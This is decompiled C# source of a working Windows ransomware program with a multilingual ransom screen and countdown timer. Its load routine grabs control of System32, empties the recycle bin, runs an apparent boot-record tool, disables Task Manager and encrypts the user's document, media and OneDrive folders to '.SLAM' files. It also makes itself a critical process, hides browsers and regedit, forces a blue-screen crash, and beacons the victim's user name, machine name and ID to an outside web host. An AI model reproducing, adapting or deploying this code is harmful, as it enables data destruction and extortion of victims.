using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using WindowsFormsApp1;

namespace Form1;

public class Form1 : Form
{
	private static uint STATUS_ASSERTION_FAILURE = 3221227110u;

	private Stopwatch oSW = new Stopwatch();

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	public DateTime dateTime_0 = DateTime.Now.AddHours(12.0);

	public string Unidad;

	public string idioma;

	public int isCritical = 1;

	public int notisCritical = 0;

	public int BreakOnTermination = 29;

	public string LogonUI = "C:\\Windows\\System32\\LogonUI.exe";

	private bool logon_check = true;

	private IContainer components = null;

	private Label lblCount;

	private TextBox txtEmailAddress;

	private Label label5;

	private Timer timer1;

	private Timer timer2;

	private Label label4;

	private Label label6;

	private Timer timer4;

	private Label label9;

	private Button button1;

	private Button button2;

	private Label label10;

	private Label label1;

	private Label label2;

	private PictureBox pictureBox1;

	private Label label3;

	private Label label11;

	private Timer timer6;

	private Timer timer7;

	private Label label12;

	private Timer timer8;

	private Timer timer11;

	private Timer timer12;

	private Label label_0;

	private Label ingles;

	private Label chino;

	private Label ruso;

	private Timer timer13;

	private Label label8;

	private Timer timer18;

	private Button button3;

	private RichTextBox richTextBox1;

	private Button button4;

	private Timer timer3;

	[DllImport("shell32")]
	private static extern void SHEmptyRecycleBin(int hwnd, string pszRootPath, int dwFlags);

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("ntdll.dll")]
	private static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	private static extern IntPtr NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public Form1()
	{
		InitializeComponent();
	}

	private void VaciarPapelera(string Unidad, bool Dialogo_Confirmar)
	{
		SHEmptyRecycleBin(0, Unidad, 1);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		idioma = "1";
		Form2.variableCompartida5 = "0";
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/k takeown /f C:\\Windows\\System32 && icacls C:\\Windows\\System32 /grant \"%username%:F\"";
		Process.Start(processStartInfo);
		timer13.Start();
		Form2.variableCompartida4 = "0";
		try
		{
			VaciarPapelera("c:\\", Dialogo_Confirmar: true);
			SHEmptyRecycleBin(0, Unidad, 1);
			((Form)this).Close();
			if (File.Exists("C:\\temp\\boot.bin"))
			{
				string text = (Form2.variableCompartida3 = File.ReadAllText("C:\\temp\\boot.bin", Encoding.Default));
				File.Delete("C:\\temp\\boot.bin");
			}
			Process.Start("C:\\temp\\mbr.exe");
		}
		catch (Exception)
		{
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
		string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
		string location2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "3D Objects");
		string location3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive");
		string file = "C:\\temp\\data\\LogonUI.exe";
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
			registryKey2.SetValue("Wallpaper", "C:\\temp\\backtrack.png", RegistryValueKind.String);
			string text2 = CreateId(40);
			Label obj = label11;
			((Control)obj).set_Text(((Control)obj).get_Text() + text2);
			Process[] array = null;
			array = Process.GetProcessesByName("LogonUI.exe");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
			string password = (Form2.variableCompartida = CreatePassword(90));
			Form2.variableCompartida2 = text2;
			encryptDirectory(folderPath, password);
			encryptDirectory(location, password);
			encryptDirectory(folderPath2, password);
			encryptDirectory(folderPath3, password);
			encryptDirectory(folderPath4, password);
			encryptDirectory(folderPath5, password);
			encryptDirectory(location2, password);
			encryptDirectory(location3, password);
			EncryptFile(file, password);
			((Form)this).set_Opacity(100.0);
			((Form)this).set_WindowState((FormWindowState)0);
			timer6.Start();
			timer4.Start();
			timer3.Start();
			timer1.Start();
			timer11.Start();
		}
		catch (Exception)
		{
		}
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 3, 4, 2, 6, 5, 1, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public string CreateId(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void EncryptFile(string file, string password)
	{
		try
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
			File.Move(file, file + ".SLAM");
			RichTextBox val = richTextBox1;
			((Control)val).set_Text(((Control)val).get_Text() + file + " >> " + file + ".SLAM" + Environment.NewLine);
		}
		catch (Exception)
		{
		}
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				Path.GetExtension(files[i]);
				EncryptFile(files[i], password);
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j], password);
			}
		}
		catch (Exception)
		{
		}
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		timer2.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "msedge")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "chrome")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
		}
		timer2.Start();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		RtlAdjustPrivilege(19, bEnablePrivilege: true, IsThreadPrivilege: false, out var _);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0u, 0u, IntPtr.Zero, 6u, out var _);
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void timer4_Tick(object sender, EventArgs e)
	{
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = dateTime_0 - now;
		string text = $"{timeSpan.Hours}:{timeSpan.Minutes}:{timeSpan.Seconds}";
		((Control)label8).set_Text(text);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Form val = ((IEnumerable)Application.get_OpenForms()).Cast<Form>().FirstOrDefault((Func<Form, bool>)((Form x) => x is Form3));
		if (val != null)
		{
			((Control)val).BringToFront();
			return;
		}
		Form val2 = (Form)(object)new Form3();
		((Control)val2).Show();
	}

	private void button2_Click(object sender, EventArgs e)
	{
		Form val = ((IEnumerable)Application.get_OpenForms()).Cast<Form>().FirstOrDefault((Func<Form, bool>)((Form x) => x is Form2));
		if (val != null)
		{
			((Control)val).BringToFront();
		}
		else if (NetworkInterface.GetIsNetworkAvailable())
		{
			Form val2 = (Form)(object)new Form2();
			((Control)val2).Show();
		}
	}

	private void timer6_Tick(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetDataObject((object)((Control)label11).get_Text(), true);
		}
		catch (Exception)
		{
		}
	}

	private void timer7_Tick(object sender, EventArgs e)
	{
		if (NetworkInterface.GetIsNetworkAvailable() && Form3.variableCompartida == "español")
		{
			((Control)button2).set_Text("revisar pago");
		}
		else if (Form3.variableCompartida == "español")
		{
			((Control)button2).set_Text("no tienes internet");
			Form val = (Form)(object)new Form2();
			val.Close();
		}
		if (NetworkInterface.GetIsNetworkAvailable() && Form3.variableCompartida == "ingles")
		{
			((Control)button2).set_Text("review payment");
		}
		else if (Form3.variableCompartida == "ingles")
		{
			((Control)button2).set_Text("you don't have internet");
			Form val2 = (Form)(object)new Form2();
			val2.Close();
		}
		if (NetworkInterface.GetIsNetworkAvailable() && Form3.variableCompartida == "chino")
		{
			((Control)button2).set_Text("审查付款");
		}
		else if (Form3.variableCompartida == "chino")
		{
			((Control)button2).set_Text("你没有互联网");
			Form val3 = (Form)(object)new Form2();
			val3.Close();
		}
		if (NetworkInterface.GetIsNetworkAvailable() && Form3.variableCompartida == "ruso")
		{
			((Control)button2).set_Text("Обзорные платежи");
		}
		else if (Form3.variableCompartida == "ruso")
		{
			((Control)button2).set_Text("у вас нет интернета");
			Form val4 = (Form)(object)new Form2();
			val4.Close();
		}
	}

	private void timer8_Tick(object sender, EventArgs e)
	{
		if (Form2.variableCompartida4 == "0")
		{
			Process.EnterDebugMode();
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, 4);
		}
		if (Form2.variableCompartida4 == "1")
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref notisCritical, 4);
		}
	}

	private void timer11_Tick(object sender, EventArgs e)
	{
		((Form)this).set_TopMost(true);
		((Form)this).set_TopMost(false);
	}

	private void timer12_Tick(object sender, EventArgs e)
	{
		if (Form3.variableCompartida == "español")
		{
			((Control)label4).set_Text("TUS ARCHIVOS HAN SIDO ENCRIPTADOS");
			((Control)label6).set_Text(((Control)label_0).get_Text());
			((Control)label12).set_Text("tu ID:");
			((Control)label9).set_Text("tiempo restante:");
		}
		if (Form3.variableCompartida == "ingles")
		{
			((Control)label4).set_Text("YOUR FILES HAVE BEEN ENCRYPTED");
			((Control)label6).set_Text(((Control)ingles).get_Text());
			((Control)label12).set_Text("your ID:");
			((Control)label9).set_Text("remaining time:");
		}
		if (Form3.variableCompartida == "chino")
		{
			((Control)label4).set_Text("您的文件已加密");
			((Control)label6).set_Text(((Control)chino).get_Text());
			((Control)label12).set_Text("你的身份证明:");
			((Control)label9).set_Text("剩余时间:");
		}
		if (Form3.variableCompartida == "ruso")
		{
			((Control)label4).set_Text("ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ");
			((Control)label6).set_Text(((Control)ruso).get_Text());
			((Control)label12).set_Text("ваш ID:");
			((Control)label9).set_Text("оставшееся время:");
		}
	}

	private void timer13_Tick(object sender, EventArgs e)
	{
		if (idioma == "1")
		{
			idioma = "2";
			((Control)button1).set_Text("язык");
		}
		if (idioma == "2")
		{
			idioma = "3";
			((Control)button1).set_Text("中文");
		}
		if (idioma == "3")
		{
			((Control)button1).set_Text("language");
		}
		if (idioma == "4")
		{
			idioma = "1";
			((Control)button1).set_Text("idioma");
		}
	}

	private void timer17_Tick(object sender, EventArgs e)
	{
	}

	private void timer18_Tick(object sender, EventArgs e)
	{
		if (!(Form2.variableCompartida5 == "0"))
		{
			timer18.set_Enabled(false);
			timer18.Stop();
		}
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Windows File Protection\\Windows Configuration");
		if (registryKey != null)
		{
			Registry.LocalMachine.DeleteSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Windows File Protection\\Windows Configuration");
		}
	}

	private void button3_Click(object sender, EventArgs e)
	{
		((Control)label1).set_Visible(false);
		((Control)label2).set_Visible(false);
		((Control)label3).set_Visible(false);
		((Control)label4).set_Visible(false);
		((Control)label5).set_Visible(false);
		((Control)label6).set_Visible(false);
		((Control)label8).set_Visible(false);
		((Control)label9).set_Visible(false);
		((Control)label10).set_Visible(false);
		((Control)label11).set_Visible(false);
		((Control)label12).set_Visible(false);
		((Control)button1).set_Visible(false);
		((Control)button2).set_Visible(false);
		((Control)button3).set_Visible(false);
		((Control)button4).set_Visible(true);
		((Control)richTextBox1).set_Size(new Size(1110, 674));
		((Control)richTextBox1).set_Location(new Point(78, 0));
		((Control)richTextBox1).set_Visible(true);
	}

	private void button4_Click(object sender, EventArgs e)
	{
		((Control)label1).set_Visible(true);
		((Control)label2).set_Visible(true);
		((Control)label3).set_Visible(true);
		((Control)label4).set_Visible(true);
		((Control)label5).set_Visible(true);
		((Control)label6).set_Visible(true);
		((Control)label8).set_Visible(true);
		((Control)label9).set_Visible(true);
		((Control)label10).set_Visible(true);
		((Control)label11).set_Visible(true);
		((Control)label12).set_Visible(true);
		((Control)button1).set_Visible(true);
		((Control)button2).set_Visible(true);
		((Control)button3).set_Visible(true);
		((Control)button4).set_Visible(false);
		((Control)richTextBox1).set_Visible(false);
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		string text = "http://anmodi.000webhostapp.com/slam/key.php?info=";
		string userName = Environment.UserName;
		string text2 = Environment.MachineName.ToString();
		string text3 = "nombre del ordenador: " + text2 + " nombre del usuario: " + userName + " id: " + ((Control)label11).get_Text();
		string address = text + text3;
		if (NetworkInterface.GetIsNetworkAvailable())
		{
			new WebClient().DownloadString(address);
			timer3.Stop();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Expected O, but got Unknown
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Expected O, but got Unknown
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Expected O, but got Unknown
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0148: Expected O, but got Unknown
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0169: Expected O, but got Unknown
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0174: Expected O, but got Unknown
		//IL_017b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0185: Expected O, but got Unknown
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		//IL_0197: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Expected O, but got Unknown
		//IL_01a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ac: Expected O, but got Unknown
		//IL_01ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b7: Expected O, but got Unknown
		//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c2: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_0204: Unknown result type (might be due to invalid IL or missing references)
		//IL_020e: Expected O, but got Unknown
		//IL_023c: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bf: Expected O, but got Unknown
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Unknown result type (might be due to invalid IL or missing references)
		//IL_036f: Expected O, but got Unknown
		//IL_03a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0480: Unknown result type (might be due to invalid IL or missing references)
		//IL_048a: Expected O, but got Unknown
		//IL_04b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Unknown result type (might be due to invalid IL or missing references)
		//IL_054d: Expected O, but got Unknown
		//IL_057b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0636: Unknown result type (might be due to invalid IL or missing references)
		//IL_0640: Expected O, but got Unknown
		//IL_0674: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08fe: Expected O, but got Unknown
		//IL_0932: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a44: Expected O, but got Unknown
		//IL_0a72: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af7: Expected O, but got Unknown
		//IL_0bba: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc4: Expected O, but got Unknown
		//IL_0ef2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0efc: Expected O, but got Unknown
		//IL_0fa8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fb2: Expected O, but got Unknown
		//IL_1100: Unknown result type (might be due to invalid IL or missing references)
		//IL_110a: Expected O, but got Unknown
		//IL_1387: Unknown result type (might be due to invalid IL or missing references)
		//IL_13cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_13d5: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		lblCount = new Label();
		txtEmailAddress = new TextBox();
		label5 = new Label();
		timer1 = new Timer(components);
		timer2 = new Timer(components);
		label4 = new Label();
		label6 = new Label();
		timer4 = new Timer(components);
		label9 = new Label();
		button1 = new Button();
		button2 = new Button();
		label10 = new Label();
		label1 = new Label();
		label2 = new Label();
		pictureBox1 = new PictureBox();
		label3 = new Label();
		label11 = new Label();
		timer6 = new Timer(components);
		timer7 = new Timer(components);
		label12 = new Label();
		timer8 = new Timer(components);
		timer11 = new Timer(components);
		timer12 = new Timer(components);
		label_0 = new Label();
		ingles = new Label();
		chino = new Label();
		ruso = new Label();
		timer13 = new Timer(components);
		label8 = new Label();
		timer18 = new Timer(components);
		button3 = new Button();
		richTextBox1 = new RichTextBox();
		button4 = new Button();
		timer3 = new Timer(components);
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lblCount).set_Anchor((AnchorStyles)14);
		((Control)lblCount).set_Font(new Font("Microsoft Tai Le", 16f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lblCount).set_ForeColor(Color.White);
		((Control)lblCount).set_Location(new Point(26, -125));
		((Control)lblCount).set_Margin(new Padding(4, 0, 4, 0));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(1152, 85));
		((Control)lblCount).set_TabIndex(0);
		((Control)lblCount).set_Text("TUS ARCHIVOS (count: n) HAN SIDO ENCRIPTADOS");
		lblCount.set_TextAlign((ContentAlignment)32);
		((Control)txtEmailAddress).set_Anchor((AnchorStyles)2);
		((Control)txtEmailAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtEmailAddress).set_Location(new Point(95, 747));
		((Control)txtEmailAddress).set_Margin(new Padding(4, 5, 4, 5));
		((Control)txtEmailAddress).set_Name("txtEmailAddress");
		((TextBoxBase)txtEmailAddress).set_ReadOnly(true);
		((Control)txtEmailAddress).set_Size(new Size(1014, 62));
		((Control)txtEmailAddress).set_TabIndex(4);
		((Control)txtEmailAddress).set_Text("friendly.cyber.criminal@gmail.com");
		txtEmailAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)label5).set_Anchor((AnchorStyles)14);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Crimson);
		((Control)label5).set_Location(new Point(18, 819));
		((Control)label5).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(1152, 109));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text(".");
		label5.set_TextAlign((ContentAlignment)32);
		timer1.set_Interval(43200000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		timer2.set_Enabled(true);
		timer2.set_Interval(1);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((Control)label4).set_Anchor((AnchorStyles)14);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Font(new Font("Microsoft Tai Le", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Red);
		((Control)label4).set_Location(new Point(-115, -7));
		((Control)label4).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(1431, 85));
		((Control)label4).set_TabIndex(12);
		((Control)label4).set_Text("TUS ARCHIVOS HAN SIDO ENCRIPTADOS");
		label4.set_TextAlign((ContentAlignment)32);
		((Control)label6).set_Anchor((AnchorStyles)14);
		((Control)label6).set_BackColor(Color.Transparent);
		((Control)label6).set_Font(new Font("Microsoft Tai Le", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.Red);
		((Control)label6).set_Location(new Point(-103, 88));
		((Control)label6).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(1431, 416));
		((Control)label6).set_TabIndex(13);
		((Control)label6).set_Text(componentResourceManager.GetString("label6.Text"));
		label6.set_TextAlign((ContentAlignment)32);
		timer4.set_Interval(1000);
		timer4.add_Tick((EventHandler)timer4_Tick);
		((Control)label9).set_Anchor((AnchorStyles)14);
		((Control)label9).set_BackColor(Color.Transparent);
		((Control)label9).set_Font(new Font("Microsoft Tai Le", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.Red);
		((Control)label9).set_Location(new Point(305, 615));
		((Control)label9).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(426, 34));
		((Control)label9).set_TabIndex(15);
		((Control)label9).set_Text("tiempo restante:");
		label9.set_TextAlign((ContentAlignment)32);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_ForeColor(Color.Red);
		((Control)button1).set_Location(new Point(1008, 566));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(159, 83));
		((Control)button1).set_TabIndex(16);
		((Control)button1).set_Text("idioma");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_ForeColor(Color.Red);
		((Control)button2).set_Location(new Point(12, 579));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(159, 83));
		((Control)button2).set_TabIndex(17);
		((Control)button2).set_Text("revisar pago");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Location(new Point(892, 174));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(60, 20));
		((Control)label10).set_TabIndex(18);
		((Control)label10).set_Text("label10");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(219, 221));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(27, 20));
		((Control)label1).set_TabIndex(11);
		((Control)label1).set_Text("12");
		((Control)label2).set_Anchor((AnchorStyles)14);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(282, 193));
		((Control)label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(1152, 85));
		((Control)label2).set_TabIndex(2);
		label2.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_Visible(false);
		((Control)pictureBox1).set_Anchor((AnchorStyles)15);
		((Control)pictureBox1).set_Location(new Point(447, 18));
		((Control)pictureBox1).set_Margin(new Padding(4, 5, 4, 5));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(617, 392));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(6);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).set_Visible(false);
		((Control)label3).set_Anchor((AnchorStyles)14);
		((Control)label3).set_Font(new Font("Microsoft Tai Le", 16f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(26, -41));
		((Control)label3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(1152, 134));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("PARA RECUPERARLOS PON LA CLAVE CORRECTA");
		label3.set_TextAlign((ContentAlignment)2);
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_Font(new Font("Microsoft Tai Le", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_ForeColor(Color.Red);
		((Control)label11).set_Location(new Point(478, 539));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(0, 23));
		((Control)label11).set_TabIndex(19);
		timer6.add_Tick((EventHandler)timer6_Tick);
		timer7.set_Enabled(true);
		timer7.set_Interval(1000);
		timer7.add_Tick((EventHandler)timer7_Tick);
		((Control)label12).set_AutoSize(true);
